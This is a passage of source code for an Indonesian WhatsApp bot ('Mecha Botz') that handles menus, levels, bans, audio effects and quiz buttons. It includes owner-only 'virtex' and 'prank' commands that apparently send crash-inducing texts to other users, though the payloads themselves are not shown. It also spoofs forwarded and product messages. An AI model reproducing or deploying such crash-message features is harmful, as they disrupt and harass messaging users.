if (isGroup && !isLevelingOn) return textImg(`Fitur leveling belum diaktifkan!`)
let userLevels = level.getLevelingLevel(sender, _level)
let userExp = level.getLevelingXp(sender, _level)
let requiredExp = 10 * Math.pow(userLevels, 2) + 50 * userLevels + 100
let userRanks = level.getUserRank(sender, _level)
try {
var pic = await surya.getProfilePicture(sender)
} catch {
var pic = 'https://i.ibb.co/t2m9fFt/88876ba5bb74.jpg'
}
var tolink = await getBuffer('https://tinyurl.com/api-create.php?url=' + pic)
let link = `https://api.lolhuman.xyz/api/rank?apikey=${lolkey}&img=${tolink}&background=${bgbot}&username=${encodeURIComponent(pushname)}&level=${userLevels}&ranking=${Number(userRanks)}&currxp=${userExp}&xpneed=${requiredExp}`
let pnya = await getBuffer (link)
let ststss = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let LevelText = `*──「 LEVEL INFO 」──*

❑ *Name :* ${pushname}
❑ *Info kontak :* ${ststss.status}
❑ *Tag :* @${sender.split('@')[0]}
❑ *EXP :* ${userExp} / ${requiredExp}
❑ *Level :* ${userLevels}
❑ *Rank :* ${rank}

*Note : Kumpulin Exp Jika Ingin Menaikkan Level*`
surya.sendMessage(from, pnya, image, {contextInfo: { forwardingScore: 9999, isForwarded: true, mentionedJid: [sender]}, quoted: msg, caption: LevelText})
break

case 'menu':case 'help':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if(menusimpel === 'true'){
let timenye = moment(msg.messageTimestamp * 1000).format('HH:mm:ss')
let youra = await surya.prepareMessage(from, suryaImg, image, {thumbnail: suryaImg})
let youLevel = level.getLevelingLevel(sender, _level)
let youExp = level.getLevelingXp(sender, _level)
let youRequiredExp = 10 * Math.pow(youLevel, 2) + 50 * youLevel + 100
let youRank = level.getUserRank(sender, _level)
let ststs = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let lisMsg = {
buttonText: 'LIST MENU 🌹',
footerText: `Jadilah diri sendiri, jangan mengikuti orang lain tetapi tidak sanggup untuk menjalaninya

© ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
description: `_*${Ucapan}*_ *${pushname}*

*❏ Your info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : @${sender.split('@')[0]}*_
├⟢ _*Bio : ${ststs.status}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${youExp}/${youRequiredExp}*_
├⟢ _*Level : ${youLevel}*_
├⟢ _*Rank : ${rank}*_
└⟢ _*Top rank : ${youRank}*_

*❏ Bot information*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator Bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Tanggal Islam : ${dateIslamic}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_`,
sections: [
{
"title": `${timenye} - ${tampilBulan}`,
rows: [
{
"title": "All Menu Botz",
description: `\nClick untuk menampilkan semua fitur bot`,
"rowId": `${prefix}menuall`
},
{
"title": "Creator Bot",
description: `\nClick untuk menampilkan creator mecha botz`,
"rowId": `${prefix}creator`
},
{
"title": `Rules`,
description: `\nClick untuk menampilkan rules mecha botz`,
"rowId": `${prefix}rules`
},
{
"title": "Info Menu",
description: `\nClick untuk menampilkan info menu`,
"rowId": `${prefix}infomenu`
},
{
"title": "Owner Menu",
description: `\nClick untuk menampilkan owner menu`,
"rowId": `${prefix}ownermenu`
},
{
"title": "Premium Menu",
description: `\nClick untuk menampilkan premium menu`,
"rowId": `${prefix}premiummenu`
},
{
"title": "Group Menu",
description: `\nClick untuk menampilkan group menu`,
"rowId": `${prefix}grupmenu`
},
{
"title": "Security Menu",
description: `\nClick untuk menampilkan security menu`,
"rowId": `${prefix}securitymenu`
},
{
"title": "Game Menu",
description: `\nClick untuk menampilkan game menu`,
"rowId": `${prefix}gamemenu`
},
{
"title": "Maker Menu",
description: `\nClick untuk menampilkan maker menu`,
"rowId": `${prefix}makermenu`
},
{
"title": "Serti Menu",
description: `\nClick untuk menampilkan sertifikat menu`,
"rowId": `${prefix}sertimenu`
},
{
"title": "Islam Menu",
description: `\nClick untuk menampilkan islami menu`,
"rowId": `${prefix}islammenu`
},
{
"title": "Quotes Menu",
description: `\nClick untuk menampilkan quotes menu`,
"rowId": `${prefix}quotesmenu`
},
{
"title": "Meme Menu",
description: `\nClick untuk menampilkan meme menu`,
"rowId": `${prefix}mememenu`
},
{
"title": "Random Menu",
description: `\nClick untuk menampilkan random menu`,
"rowId": `${prefix}randommenu`
},
{
"title": "Baileys Menu",
description: `\nClick untuk menampilkan baileys menu`,
"rowId": `${prefix}baileysmenu`
},
{
"title": "Tools Menu",
description: `\nClick untuk menampilkan tools menu`,
"rowId": `${prefix}toolsmenu`
},
{
"title": `Stalker Menu`,
description: `\nClick untuk menampilkan stalker menu`,
"rowId": `${prefix}stalkermenu`
},
{
"title": `Anime Menu`,
description: `\nClick untuk menampilkan anime menu`,
"rowId": `${prefix}animemenu`
},
{
"title": `Penambah Dosa`,
description: `\nClick untuk menampilkan nsfw menu`,
"rowId": `${prefix}nsfwmenu`
},
{
"title": `Fitur Baru`,
description: `\nClick untuk menampilkan fitur baru`,
"rowId": `${prefix}fiturbaru`
}
]
}],
listType: 1
}
surya.sendMessage(from, lisMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender, Suryaa]},quoted:ftroli})
}
else if(menuproduk === 'true'){
let ststs = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let cokLevel = level.getLevelingLevel(sender, _level)
let cokExp = level.getLevelingXp(sender, _level)
let cokRequiredExp = 10 * Math.pow(cokLevel, 2) + 50 * cokLevel + 100
let cokRank = level.getUserRank(sender, _level)
let imeu = await surya.prepareMessage('0@s.whatsapp.net', suryaImg, image) 
let imeg = imeu.message.imageMessage
let resis = await surya.prepareMessageFromContent(from,{
"productMessage": {
"product": {
"productImage": imeg,
"productId": suryaImg,
"title": `LIST MENU FEATURE`,
"description": `${Ucapan}${pushname}

*❏ About Mecha*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator bot : wa.me/${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_

*❏ Your Info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : wa.me/${sender.split('@')[0]}*_
├⟢ _*Bio : ${ststs.status}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${cokExp}/${cokRequiredExp}*_
├⟢ _*Level : ${cokLevel}*_
├⟢ _*Rank : ${rank}*_
└⟢ _*Top rank : ${cokRank}*_

${MENU}`,
"currencyCode": "IDR",
"priceAmount1000": "100000",
"productImageCount": 1
},
"businessOwnerJid": "62895415497664@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:ftroli, contextInfo: {"mentionedJid": [sender, Suryaa]}}) 
surya.relayWAMessage(resis)
}
else if (menubutton === 'true'){
let Bio = await surya.getStatus(`${sender.split('@')[0]}@c.us`)
let cokLevel = level.getLevelingLevel(sender, _level)
let cokExp = level.getLevelingXp(sender, _level)
let cokRequiredExp = 10 * Math.pow(cokLevel, 2) + 50 * cokLevel + 100
let cokRank = level.getUserRank(sender, _level)
const cokmemek = [{buttonId: 'listprem', buttonText: {displayText: 'List Premium'}, type: 1},
{buttonId: 'sewabot', buttonText: {displayText: 'Sewa Botz'}, type: 1},
{buttonId: 'rules', buttonText: {displayText: 'Rules Botz'}, type: 1}]
const cokasuMessage = {
//imageMessage: imeu.message.imageMessage,
contentText: `${Ucapan} @${sender.split('@')[0]}`,
footerText: `
*❏ About Mecha*
├⟢ _*Name : © ᴍᴇᴄʜᴀ ʙᴏᴛᴢ VIP*_
├⟢ _*Type : Nodejs*_
├⟢ _*Platform : Android*_
├⟢ _*Baterai : ${baterai.baterai}% - ${baterai.cas === 'true' ? 'Charged' : 'Not charged'}*_
├⟢ _*Device : Xiaomi*_
├⟢ _*Creator bot : @${Suryaa.split('@')[0]}*_
├⟢ _*Waktu : ${timesNow}*_
├⟢ _*Runtime : ${runtime(process.uptime())}*_
├⟢ _*Total hit : ${hit_today.length}*_
├⟢ _*Total User : ${pendaftar.length}*_
├⟢ _*Total Register : ${_registered.length}*_
└⟢ _*Versi : Mecha Botz Update Versi 19*_

*❏ Your Info*
├⟢ _*Name : ${pushname}*_
├⟢ _*Number : @${sender.split('@')[0]}*_
├⟢ _*Bio : ${Bio.status}*_
├⟢ _*Status : ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*_
├⟢ _*Limit : ${isPremium ? 'Unlimited' : `${getLimit(sender, limitCount, limit)}/${limitCount}`}*_
├⟢ _*Limit game : ${cekGLimit(sender, gcount, glimit)}/${gcount}*_
├⟢ _*Balance : $${getBalance(sender, balance)}*_
├⟢ _*Expired prem : ${isOwner ? 'Permanen' : isPremium ? expired : 'Not Premium'}*_
├⟢ _*EXP : ${cokExp}/${cokRequiredExp}*_
├⟢ _*Level : ${cokLevel}*_
├⟢ _*Rank : ${rank}*_
└⟢ _*Top rank : ${cokRank}*_

${MENU}

Jadilah diri sendiri, jangan mengikuti orang lain tetapi tidak sanggup untuk menjalaninya`,
buttons: cokmemek,
headerType: 1
}
surya.sendMessage(from, cokasuMessage, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000,
isForwarded: false,
sendEphemeral: true,
"externalAdReply": {
"title": `Hallo ${pushname}` ,
"body": `${Ucapan}`,
"mediaType": "2",
"thumbnailUrl": "https://i.ibb.co/v1cj7xp/820baf60f67e.jpg",
"mediaUrl": "https://youtu.be/3jYbJq2JMiM",
"thumbnail": fs.readFileSync('./sticker/mecha.jpeg'),
"sourceUrl": "https://www.instagram.com/surya_skylark05",
},mentionedJid:[Suryaa, sender]}, msg})
}
break
case 'stmenu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
if(args[1] == 'produk'){
menusimpel = 'false'
menubutton = 'false'
menuproduk = 'true'
reply(mess.success)
} else if(args[1] == 'list'){
menusimpel = 'true'
menuproduk = 'false'
menubutton = 'false'
reply(mess.success)
} else if(args[1] == 'button'){
menusimpel = 'false'
menubutton = 'true'
menuproduk = 'false'
reply(mess.success)
}else{
reply(`Cara Penggunaan : ${prefix}setmenu button\n\nTersedia\n •simpel\n •button`)
}
break

case 'getnamegc': case 'getnamegrup':{
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`${groupName}`)
}
break
case 'getdeksgc': case 'getdeskgrup':{
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
textImg(`${groupMetadata.desc}`)
}
break
case 'sjam': case 'swaktu':{
if (!isRegister) return
if (isMuted) return
if (isBan) return 
mentions(`${Ucapan} @${sender.split('@')[0]}
${sholat}

╭━━❬ *WAKTU* ❭
│• _*${wib}*_
│• _*${wit}*_
│• _*${wita}*_
│• _*Tanggal : ${tampilBulan}*_
│• _*Tanggal Islam : ${dateIslamic}*_
└─────────────────`, [sender], true)
}
break

case 'v1': case 'virtex1':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
Flink(virtex())
}
break
case 'v2': case 'virtex2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
Flink(virtex2())
}
break
case 'v3': case 'virtex3':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
Flink(vir3())
}
break
case 'v4': case 'virtex4':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !fromMe && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
if (isMuted) return
if (isBan) return 
Flink(virtex4())
}
break

case 'prank':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2 && !fromMe) return mentions(mess.OnlySurya, [Suryaa], true)
Flink(prank())
}
break
case 'animesaran':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(animesaran())
limitAdd(sender, limit)
}
break
case 'tahlil':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
Flink(tahlil())
limitAdd(sender, limit)
}
break
case 'listsurah':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
Flink(listsurah())
}
break
case 'getppgrup': case 'getppgc':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
try {
var pic = await surya.getProfilePicture(from)
} catch {
var pic = 'https://i.ibb.co/9cNvmZh/Onichan.jpg'
}
surya.sendMessage(from, await getBuffer(pic), image, msg)
break
case 'kodebahasa':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
textImg(`
╭━━°❀❬ *KODE BAHASA* ❭❀°━━┓
│
│• af : Afrikaans
│• sq : Albanian
│• ar : Arab
│• hy : Armenian
│• ca : Catalan
│• zh : Chinese
│• zh-cn : Chinese (Mandarin/China)
│• zh-tw : Chinese (Mandarin/Taiwan)
│• zh-yue : Chinese (Cantonese)
│• hr : Croatian
│• cs : Czech
│• da : Danish
│• nl : Dutch
│• en : English
│• en-au : English (Australia)
│• en-uk : English (United Kingdom)
│• en-us : English (United States)
│• eo : Esperanto
│• fi : Finnish
│• fr : French
│• de : German
│• el : Greek
│• ht : Haitian Creole
│• hi : Hindi
│• hu : Hungarian
│• is : Icelandic
│• id : Indonesian
│• it : Italian
│• ja : Japanese
│• ko : Korean
│• la : Latin
│• lv : Latvian
│• mk : Macedonian
│• no : Norwegian
│• pl : Polish
│• pt : Portuguese
│• pt-br : Portuguese (Brazil)
│• ro : Romanian
│• ru : Russian
│• sr : Serbian
│• sk : Slovak
│• es : Spanish
│• es-es : Spanish (Spain)
│• es-us : Spanish (United States)
│• sw : Swahili
│• sv : Swedish
│• ta : Tamil
│• th : Thai
│• tr : Turkish
│• vi : Vietnamese
│• cy : Welsh
└────────────────`)
break

//------------------< BAN >-------------------
            case 'ban':
                if (!isOwner) return reply(mess.OnlySurya)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                        addBanned(mentioned[0], args[2], ban)
                    }
                    textImg('Sukses')
                } else if (isQuotedMsg) {
                    if (quotedMsg.sender === ownerNumber) return reply(`Tidak bisa ban Owner`)
                    addBanned(quotedMsg.sender, args[1], ban)
                    textImg(`Sukses ban target`)
                } else if (!isNaN(args[1])) {
                    addBanned(args[1] + '@s.whatsapp.net', args[2], ban)
                    textImg('Sukses')
                } else {
                    reply(`Kirim perintah ${prefix}ban @tag atau nomor atau reply pesan orang yang ingin di ban`)
                }
                break
            case 'unban':
                if (!isOwner) return reply(mess.OnlySurya)
                if (mentioned.length !== 0){
                    for (let i = 0; i < mentioned.length; i++){
                        unBanned(mentioned[i], ban)
                    }
                    textImg('Sukses')
                }if (isQuotedMsg) {
                    unBanned(quotedMsg.sender, ban)
                    textImg(`Sukses unban target`) 
                } else if (!isNaN(args[1])) {
                    unBanned(args[1] + '@s.whatsapp.net', ban)
                    textImg('Sukses')
                } else {
                    reply(`Kirim perintah ${prefix}unban @tag atau nomor atau reply pesan orang yang ingin di unban`)
                }
                break
            case 'listban':
                let txtx = `List Banned\nJumlah : ${ban.length}\n\n`
                let menx = [];
                for (let i of ban){
                    menx.push(i.id)
                    txtx += `*ID :* @${i.id.split("@")[0]}\n`
                    if (i.expired === 'PERMANENT'){
                        let cekvip = 'PERMANENT'
                        txtx += `*Expire :* PERMANENT\n\n`
                    } else {
                        let cekvip = ms(i.expired - Date.now())
                        txtx += `*Expire :* ${cekvip.days} day ${cekvip.hours} hour ${cekvip.minutes} minute ${cekvip.seconds} second\n\n`
                    }
                }
                mentions(txtx, menx, true)
                break

case 'slowmo':
let encmedi = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let mediu = await surya.downloadAndSaveMediaMessage(encmedi)
let rann = getRandom('.mp3')
exec(`ffmpeg -i ${mediu} -filter:a "atempo=0.7,asetrate=44100" ${rann}`, (err, stderr, stdout) => {
fs.unlinkSync(mediu)
if (err) return reply('Error!')
let uhh = fs.readFileSync(rann)
 surya.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftroli,duration:9999999999})
 fs.unlinkSync(rann)
})
 break
case 'tupai':
let encmediu = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let mediae = await surya.downloadAndSaveMediaMessage(encmediu)
let rannu = getRandom('.mp3')
exec(`ffmpeg -i ${mediae} -filter:a "atempo=0.5,asetrate=65100" ${rannu}`, (err, stderr, stdout) => {
fs.unlinkSync(mediae)
if (err) return reply('Error!')
let uhh = fs.readFileSync(rannu)
 surya.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftroli,duration:9999999999})
 fs.unlinkSync(rannu)
})
 break
case 'bass':
let synk = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
let mayra = await surya.downloadAndSaveMediaMessage(synk)
let ranni = getRandom('.mp3')
exec(`ffmpeg -i ${mayra} -af equalizer=f=94:width_type=o:width=2:g=30 ${ranni}`, (err, stderr, stdout) => {
fs.unlinkSync(mayra)
if (err) return reply('Error!')
let uhh = fs.readFileSync(ranni)
 surya.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftroli,duration:9999999999})
 fs.unlinkSync(ranni)
})
 break

case 'gemuk':
let encmediao = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let sarah = await surya.downloadAndSaveMediaMessage(encmediao)
let ranno = getRandom('.mp3')
exec(`ffmpeg -i ${sarah} -filter:a "atempo=1.6,asetrate=22100" ${ranno}`, (err, stderr, stdout) => {
fs.unlinkSync(sarah)
if (err) return reply('Error!')
let uhh = fs.readFileSync(ranno)
 surya.sendMessage(from, uhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftroli,duration:9999999999})
 fs.unlinkSync(ranno)
})
 break
case 'fast':
let fast = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo
 let mine = await surya.downloadAndSaveMediaMessage(fast)
let fastt = getRandom('.mp3')
exec(`ffmpeg -i ${mine} -filter:a "atempo=1.63,asetrate=44100" ${fastt}`, (err, stderr, stdout) => {
fs.unlinkSync(mine)
if (err) return reply('Error!')
let ahhhh = fs.readFileSync(fastt)
 surya.sendMessage(from, ahhhh, audio, {mimetype: 'audio/mp4', ptt:true, quoted: ftroli,duration:9999999999})
 fs.unlinkSync(fastt)
})
 break

case 'infos':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons1 = [
{buttonId: 'infos1', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info1', buttonText: {displayText: 'Tidak'}, type: 1}]
const button1Message = {
contentText: `SILAHKAN JAWAB BEBERAPA PERTANYAAN BERIKUT INI!

*_Apakah Kamu Suka Game Mobile Legends ?_*`,
buttons: buttons1,
headerType: 1
}
surya.sendMessage(from, button1Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos1': case 'info1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons2 = [
{buttonId: 'infos2', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info2', buttonText: {displayText: 'Tidak'}, type: 1}]
const button2Message = {
contentText: `*_Apakah Kamu Suka Game Burik ?_*`,
buttons: buttons2,
headerType: 1
}
surya.sendMessage(from, button2Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos2': case 'info2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons3 = [
{buttonId: 'infos3', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info3', buttonText: {displayText: 'Tidak'}, type: 1}]
const button3Message = {
contentText: `*_Apakah Kamu Mau Jadi Adek Saya ?_*`,
buttons: buttons3,
headerType: 1
}
surya.sendMessage(from, button3Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos3': case 'info3':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons4 = [
{buttonId: 'infos4', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info4', buttonText: {displayText: 'Tidak'}, type: 1}]
const button4Message = {
contentText: `*_Apakah Kamu Mau Jadi Sahabat Saya ?_*`,
buttons: buttons4,
headerType: 1
}
surya.sendMessage(from, button4Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos4': case 'info4':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons5 = [
{buttonId: 'infos5', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info5', buttonText: {displayText: 'Tidak'}, type: 1}]
const button5Message = {
contentText: `*_Apakah Kamu Masih Suka Sama Mantan ?_*`,
buttons: buttons5,
headerType: 1
}
surya.sendMessage(from, button5Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos5': case 'info5':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons6 = [
{buttonId: 'infos6', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info6', buttonText: {displayText: 'Tidak'}, type: 1}]
const button6Message = {
contentText: `*_Apakah Kamu Seorang Gamers ?_*`,
buttons: buttons6,
headerType: 1
}
surya.sendMessage(from, button6Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos6': case 'info6':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons7 = [
{buttonId: 'infos7', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info7', buttonText: {displayText: 'Tidak'}, type: 1}]
const button7Message = {
contentText: `*_Apakah Kamu Beban Keluarga ?_*`,
buttons: buttons7,
headerType: 1
}
surya.sendMessage(from, button7Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos7': case 'info7':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons8 = [
{buttonId: 'infos8', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info8', buttonText: {displayText: 'Tidak'}, type: 1}]
const button8Message = {
contentText: `*_Apakah Kamu Anak Yatim ?_*`,
buttons: buttons8,
headerType: 1
}
surya.sendMessage(from, button8Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos8': case 'info8':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons9 = [
{buttonId: 'infos9', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info9', buttonText: {displayText: 'Tidak'}, type: 1}]
const button9Message = {
contentText: `*_Apakah Kamu Suka Rebahan ?_*`,
buttons: buttons9,
headerType: 1
}
surya.sendMessage(from, button9Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos9': case 'info9':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons10 = [
{buttonId: 'infos10', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info10', buttonText: {displayText: 'Tidak'}, type: 1}]
const button10Message = {
contentText: `*_Apakah Kamu Pemalas ?_*`,
buttons: buttons10,
headerType: 1
}
surya.sendMessage(from, button10Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos10': case 'info10':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
